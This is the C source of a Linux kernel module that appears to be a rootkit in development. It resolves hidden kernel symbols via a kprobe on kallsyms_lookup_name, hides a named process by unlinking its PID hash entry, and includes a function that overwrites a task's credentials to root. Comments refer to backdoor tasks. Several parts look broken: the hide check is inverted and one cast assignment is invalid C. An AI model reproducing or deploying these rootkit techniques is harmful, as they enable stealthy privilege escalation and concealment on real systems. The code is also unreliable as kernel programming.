#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/pid_namespace.h>
#include <linux/cred.h>
#include <linux/kprobes.h>

struct hidden_tasks {
    struct task_struct *task;
    struct fs_file_node *fnode;  // FS associated with task NULL if kernel thread

    int select; 		//backdoor tasks cannot be left hanging around
    struct list_head list;
    pid_t group;

    __be32 saddr; 		// It is backdoor task if source address != 0
};

bool lkm_task_hidden = false;

static int lkm_task_root(struct task_struct *t); 

static unsigned long (*find_sym)(const char *name) = NULL;	//Will be "kallsyms_lookup_name()"
static void (*lkm_attach_pid)(struct task_struct *task, enum pid_type) = NULL;

static unsigned long sym2addr(const char *name) {
	if(!find_sym) {
		struct kprobe kp = {
			.symbol_name = "kallsyms_lookup_name",
		};

		if(register_kprobe(&kp) < 0) return 0;
		find_sym = (unsigned long(*)(const char *name))kp.addr;
		unregister_kprobe(&kp);
	}

	return find_sym(name);
}
static int _hide_task(struct task_struct *t) {

	struct hlist_node *link;
//	struct hidden_tasks *node = (struct hidden_tasks *)data;
//	link = &node->task->pid_links[PIDTYPE_PID];
	if(!lkm_task_hidden) return -1;
	printk(KERN_INFO "Hide...\n");
	link = &t->pid_links[PIDTYPE_PID];
	hlist_del(link);
	lkm_task_hidden = true;

	return 0;
}

static int _unhide_task(struct task_struct *t) {


	if(!lkm_attach_pid) return -2; 
	if(lkm_task_hidden) return -1;

	printk(KERN_INFO "Unhide...\n");
	lkm_attach_pid(t, PIDTYPE_PID);
	lkm_task_hidden = false;
	
	return 0;
}

static int lkm_task_root(struct task_struct *t) {
	
        struct cred *cr = (struct cred*)t->cred;

	cr->uid.val = cr->gid.val = 0;
	cr->euid.val = cr->egid.val = 0;
	cr->suid.val = cr->sgid.val = 0;
	cr->fsuid.val = cr->fsgid.val = 0;

	return 0;
}

static void lkm_print_cred(struct task_struct *t); 
static void lkm_print_task(struct task_struct *t);

static int lkm_task_list(void) {

	struct task_struct *t;
	for_each_process(t) {
		printk(KERN_INFO "------------------------------\n");
		lkm_print_task(t);
		lkm_print_cred(t);
		printk(KERN_INFO "______________________________\n");
		if(!strcmp(t->comm, "tttt")) {
			printk(KERN_INFO "!!!!find MY task\n");
			_hide_task(t);
			_unhide_task(t);
			break;
		}
		if(t->pid == 534366) {

			lkm_print_cred(t);
			break;
		}
	}
	return 0;
}

static void lkm_print_task(struct task_struct *t) {

	printk(KERN_INFO "pid=%d||name(%s)\n", t->pid, t->comm);
	return;
}
static void lkm_print_cred(struct task_struct *t) {
	
        struct cred *cr = (struct cred*)t->cred;
	printk(KERN_INFO "---uid(%d)||gid(%d)\n", cr->uid.val, cr->gid.val);
	printk(KERN_INFO "---euid(%d)||egid(%d)\n", cr->euid.val, cr->egid.val);
	printk(KERN_INFO "---suid(%d)||sgid(%d)\n", cr->suid.val, cr->sgid.val);
	printk(KERN_INFO "---fsuid(%d)||fsgid(%d)\n", cr->fsuid.val, cr->fsgid.val);
	return;
}


static int __init lkm_task_init(void) {
	printk(KERN_INFO "++++++ LKM_TASK, ale-alE-aLE-OP ++++++\n");

	(long unsigned int)lkm_attach_pid = sym2addr("attach_pid");
	if(lkm_attach_pid) {
		printk(KERN_INFO "SYM2ADDR addr: %lx\n", lkm_attach_pid);
		lkm_task_list();
	}

	printk(KERN_INFO "ret: %lx\n", lkm_attach_pid);
	return 0;
}
static void __exit lkm_task_exit(void) {

	printk(KERN_INFO "++++++ LKM_TASK, HN-Hn-hn ++++++\n");
	return;
}

module_init(lkm_task_init);
module_exit(lkm_task_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("TASKS LKM...");
MODULE_VERSION("0.01");
